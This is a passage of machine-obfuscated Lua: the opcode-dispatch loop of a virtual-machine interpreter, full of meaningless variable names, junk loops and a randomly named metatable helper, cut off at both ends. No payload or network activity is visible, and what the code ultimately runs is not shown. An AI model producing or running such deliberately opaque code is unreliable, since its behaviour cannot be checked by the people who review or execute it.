then repeat if 5<l then l=-2;break;end;c(s,a);until true;else c(s,a);end end end l=l+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];l=0;while l>-1 do if 2>=l then if l>=1 then if-2~=l then for t=49,91 do if 1<l then o=n;break;end;h=e;break;end;else h=e;end else f=t;end else if l>4 then if 5<l then l=-2;else c(s,a);end else if l~=-1 then for t=12,89 do if 4~=l then a=f[o];break;end;s=f[h];break;end;else s=f[h];end end end l=l+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);end end else if f<=241 then local f;for l=0,6 do if 3>l then if 0<l then if l==1 then c(t[e],t[n]);r=r+1;t=d[r];else c(t[e],t[n]);r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end else if l<=4 then if 0~=l then for f=18,70 do if l~=3 then c(t[e],t[n]);r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];break;end;else c(t[e],t[n]);r=r+1;t=d[r];end else if l>1 then repeat if l~=5 then f=t[e]c[f]=c[f](s(c,f+1,t[n]))break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c(t[e],t[n]);r=r+1;t=d[r];end end end end else if f~=239 then repeat if f~=242 then local f,h;f=t[e]c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];break;end;c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];until true;else local f,h;f=t[e]c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];end end end end else if 230>f then if 227<=f then if 227>=f then for t=t[e],t[n]do c[t]=nil;end;r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]][c[t[n]]]=c[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]=(t[n]~=0);r=r+1;t=d[r];c[t[e]][c[t[n]]]=c[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]=(t[n]~=0);else if 224<=f then repeat if 229>f then local f,u,k,a;f=t[e]u,k=b(c[f](c[f+1]))o=k+f-1 a=0;for t=f,o do a=a+1;c[t]=u[a];end;r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,o))r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];break;end;local f;f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];r=t[n];until true;else local f,k,u,a;f=t[e]k,u=b(c[f](c[f+1]))o=u+f-1 a=0;for t=f,o do a=a+1;c[t]=k[a];end;r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,o))r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];end end else if 222<=f then for h=46,58 do if 225~=f then local f;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];break;end;c[t[e]][c[t[n]]]=c[t[l]];break;end;else local f;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];end end else if 232>=f then if f<231 then local f,u,a,h;c[t[e]]=c[t[n]];r=r+1;t=d[r];f=t[e]u,a=b(c[f](c[f+1]))o=a+f-1 h=0;for t=f,o do h=h+1;c[t]=u[h];end;r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,o))r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];else if f>=228 then for s=28,70 do if 232~=f then if not c[t[e]]then r=r+1;else r=t[n];end;break;end;local f;c[t[e]]();r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])break;end;else local f;c[t[e]]();r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])end end else if 234<=f then if f<235 then local f,h;c[t[e]]={};r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];end else local s,u,b,a,o,f;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=0;while f>-1 do if f>2 then if 5>f then if 2<=f then for t=23,56 do if f<4 then a=s[b];break;end;o=s[u];break;end;else o=s[u];end else if f~=1 then repeat if 5<f then f=-2;break;end;c(o,a);until true;else c(o,a);end end else if 1>f then s=t;else if f~=1 then b=n;else u=e;end end end f=f+1 end end end end end else if 258>f then if 252<=f then if 254<f then if 256<=f then if 254~=f then repeat if 256<f then local f,s;c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];f=t[e];s=c[t[n]];c[f+1]=s;c[f]=s[t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]]={};break;end;local g,b,y,p,g,f,h,a,j,m,_,s,k,u,o;f=0;while f>-1 do if 3>f then if 0>=f then h=t;else if f~=2 then b=e;else y=n;end end else if 4<f then if 4~=f then for t=46,65 do if 6~=f then c(s,p);break;end;f=-2;break;end;else f=-2;end else if f>0 then for t=27,86 do if 3<f then s=h[b];break;end;p=h[y];break;end;else s=h[b];end end end f=f+1 end r=r+1;t=d[r];f=0;while f>-1 do if 4<=f then if f<=5 then if 0~=f then repeat if 5~=f then _=m[h[j]];break;end;s=h[a];until true;else s=h[a];end else if f~=5 then repeat if f~=7 then c[s]=_;break;end;f=-2;until true;else c[s]=_;end end else if f>=2 then if 3==f then m=c;else j=n;end else if f>-3 then repeat if f>0 then a=e;break;end;h=t;until true;else a=e;end end end f=f+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];k=t[n];u=c[k]for t=k+1,t[l]do u=u..c[t];end;c[t[e]]=u;r=r+1;t=d[r];o=t[e]c[o]=c[o](c[o+1])r=r+1;t=d[r];if not c[t[e]]then r=r+1;else r=t[n];end;until true;else local f,s;c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];f=t[e];s=c[t[n]];c[f+1]=s;c[f]=s[t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]]={};end else local f,o;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))end else if f>=253 then if 251~=f then for d=32,96 do if f>253 then if(c[t[e]]<=c[t[l]])then r=r+1;else r=t[n];end;break;end;if(c[t[e]]<=t[l])then r=t[n];else r=r+1;end;break;end;else if(c[t[e]]<=t[l])then r=t[n];else r=r+1;end;end else local f;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]=c[t[n]][c[t[l]]];r=r+1;t=d[r];if not c[t[e]]then r=r+1;else r=t[n];end;end end else if 249>f then if 248>f then local o=p[t[n]];local s;local f={};s=u.jYsqctPz({},{__index=function(r,t)local t=f[t];return t[1][t[2]];end,__newindex=function(c,t,r)local t=f[t]t[1][t[2]]=r;end;});for e=1,t[l]do r=r+1;local t=d[r];if t[z]==299 then f[e-1]={c,t[n]};else f[e-1]={a,t[n]};end;k[#k+1]=f;end;c[t[e]]=j(o,s,h);else local o,b,a,_,u,k,p,f;o=t[e]c[o](s(c,o+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];o=t[e];b=c[t[n]];c[o+1]=b;c[o]=b[t[l]];r=r+1;t=d[r];f=0;while f>-1 do if f<3 then if f<1 then a=t;else if f~=-2 then for t=29,82 do if 2>f then _=e;break;end;u=n;break;end;else u=n;end end else if 4<f then if f>5 then f=-2;else c(p,k);end else if f>=1 then repeat if 4~=f then k=a[u];break;end;p=a[_];until true;else k=a[u];end end end f=f+1 end r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];o=t[e]c[o]=c[o]()r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];end else if f<250 then local f,h;for o=0,1 do if-4<=o then for a=44,87 do if o~=1 then f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];break;end;else f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end end else if f>=248 then for o=22,82 do if f>250 then local s;for f=0,4 do if f<2 then if 1==f then s=t[e]c[s]=c[s]()r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if f>=3 then if 4>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if c[t[e]]then r=r+1;else r=t[n];end;end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end break;end;local f,o;f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);break;end;else local s;for f=0,4 do if f<2 then if 1==f then s=t[e]c[s]=c[s]()r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if f>=3 then if 4>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if c[t[e]]then r=r+1;else r=t[n];end;end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end end end else if 263<f then if 267<=f then if 268>f then local t=t[e]c[t](c[t+1])else if f>267 then for o=38,92 do if 268<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);break;end;local f,o;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];for t=t[e],t[n]do c[t]=nil;end;r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];if not c[t[e]]then r=r+1;else r=t[n];end;break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);end end else if 264>=f then local f,o,a,u,k,p,_,b,h;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[c[t[l]]];r=r+1;t=d[r];h=0;while h>-1 do if 3<h then if 6>h then if h~=1 then for t=45,89 do if h~=4 then b=a[u];break;end;_=p[a[k]];break;end;else b=a[u];end else if 6==h then c[b]=_;else h=-2;end end else if h<2 then if-4~=h then repeat if h>0 then u=e;break;end;a=t;until true;else a=t;end else if h>=1 then for t=27,53 do if h<3 then k=n;break;end;p=c;break;end;else k=n;end end end h=h+1 end r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[c[t[l]]];r=r+1;t=d[r];c[t[e]]=c[t[n]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))else if f>262 then for o=16,74 do if f<266 then local f,o;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))break;end;c[t[e]][c[t[n]]]=c[t[l]];break;end;else local f,o;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))end end end else if 260<f then if 262>f then local s;for f=0,4 do if f>=2 then if 2>=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if f>0 then repeat if f~=3 then if c[t[e]]then r=r+1;else r=t[n];end;break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f==1 then s=t[e]c[s]=c[s]()r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end else if f>260 then for h=22,91 do if 262~=f then c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][c[t[n]]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][c[t[n]]]=c[t[l]];break;end;else c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];end end else if f>=259 then if f~=260 then local f;c[t[e]]();r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])else local d=t[e];local n={};for t=1,#k do local t=k[t];for r=0,#t do local r=t[r];local e=r[1];local t=r[2];if e==c and t>=d then n[t]=e[t];r[1]=n;end;end;end;end else local s;for f=0,4 do if f<=1 then if f~=-1 then repeat if 1~=f then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;s=t[e]c[s]=c[s]()r=r+1;t=d[r];until true;else s=t[e]c[s]=c[s]()r=r+1;t=d[r];end else if 3>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if f~=2 then repeat if 4~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if not c[t[e]]then r=r+1;else r=t[n];end;until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end end end end end end else if f<=314 then if 291>=f then if f<=280 then if f<275 then if f>=272 then if 273>f then local a,k,u,b,_,f,o,p;f=0;while f>-1 do if 3>f then if 1<=f then if f~=-2 then for t=49,97 do if 2>f then k=e;break;end;u=n;break;end;else u=n;end else a=t;end else if 5>f then if 1~=f then repeat if 4>f then b=a[u];break;end;_=a[k];until true;else b=a[u];end else if f==5 then c(_,b);else f=-2;end end end f=f+1 end r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];o=t[e];p=c[t[n]];c[o+1]=p;c[o]=p[t[l]];r=r+1;t=d[r];f=0;while f>-1 do if f>=3 then if 5>f then if 1~=f then for t=41,70 do if f~=3 then _=a[k];break;end;b=a[u];break;end;else b=a[u];end else if f~=2 then for t=38,90 do if f~=6 then c(_,b);break;end;f=-2;break;end;else f=-2;end end else if f>0 then if f>-2 then repeat if f~=1 then u=n;break;end;k=e;until true;else k=e;end else a=t;end end f=f+1 end r=r+1;t=d[r];o=t[e]c[o]=c[o](s(c,o+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];o=t[e]c[o](s(c,o+1,t[n]))else if 274>f then do return c[t[e]]end else local s;for f=0,4 do if f>=2 then if 3>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if-1<=f then repeat if f~=4 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if c[t[e]]then r=r+1;else r=t[n];end;until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if-4<=f then for l=48,57 do if f<1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;s=t[e]c[s]=c[s]()r=r+1;t=d[r];break;end;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end end else if f>268 then repeat if 270~=f then if(c[t[e]]==c[t[l]])then r=r+1;else r=t[n];end;break;end;local t=t[e];do return s(c,t,o)end;until true;else if(c[t[e]]==c[t[l]])then r=r+1;else r=t[n];end;end end else if f>=278 then if 279>f then local t=t[e]c[t]=c[t](c[t+1])else if 279==f then if(c[t[e]]<t[l])then r=r+1;else r=t[n];end;else local f,o;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];if not c[t[e]]then r=r+1;else r=t[n];end;end end else if f>275 then if 274<f then repeat if 277>f then local f,a,u,k,s;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];a=c[t[n]];c[f+1]=a;c[f]=a[t[l]];r=r+1;t=d[r];f=t[e]u,k=b(c[f](c[f+1]))o=k+f-1 s=0;for t=f,o do s=s+1;c[t]=u[s];end;break;end;local f,h;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];if c[t[e]]then r=r+1;else r=t[n];end;until true;else local f,a,u,k,s;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];a=c[t[n]];c[f+1]=a;c[f]=a[t[l]];r=r+1;t=d[r];f=t[e]u,k=b(c[f](c[f+1]))o=k+f-1 s=0;for t=f,o do s=s+1;c[t]=u[s];end;end else local o,b,a,u,k,f,h;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=0;while f>-1 do if 2<f then if 4>=f then if f>1 then for t=17,68 do if 4>f then u=o[a];break;end;k=o[b];break;end;else u=o[a];end else if 6>f then c(k,u);else f=-2;end end else if 0<f then if 0<=f then for t=33,58 do if f>1 then a=n;break;end;b=e;break;end;else a=n;end else o=t;end end f=f+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];h=t[e]c[h]=c[h](s(c,h+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];end end end else if f>285 then if 288>=f then if 287>f then local s;for f=0,4 do if f>1 then if 3<=f then if f>=-1 then repeat if 4>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if c[t[e]]then r=r+1;else r=t[n];end;until true;else if c[t[e]]then r=r+1;else r=t[n];end;end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if-3<f then repeat if f~=0 then s=t[e]c[s]=c[s]()r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];until true;else s=t[e]c[s]=c[s]()r=r+1;t=d[r];end end end else if f~=287 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];else c[t[e]]();end end else if 290>f then local f;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))else if f==291 then local r=t[e]local n={c[r](c[r+1])};local e=0;for t=r,t[l]do e=e+1;c[t]=n[e];end else c[t[e]]={};end end end else if 282<f then if 283>=f then if(t[e]<=c[t[l]])then r=t[n];else r=r+1;end;else if 282<f then repeat if f>284 then local s,f;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];s=t[e];f=c[t[n]];c[s+1]=f;c[s]=f[t[l]];break;end;local f,o,b,j,p,a,_,u;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[c[t[l]]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];o=t[n];b=c[o]for t=o+1,t[l]do b=b..c[t];end;c[t[e]]=b;r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];j={};for t=1,#k do p=k[t];for t=0,#p do a=p[t];_=a[1];u=a[2];if _==c and u>=f then j[u]=_[u];a[1]=j;end;end;end;until true;else local 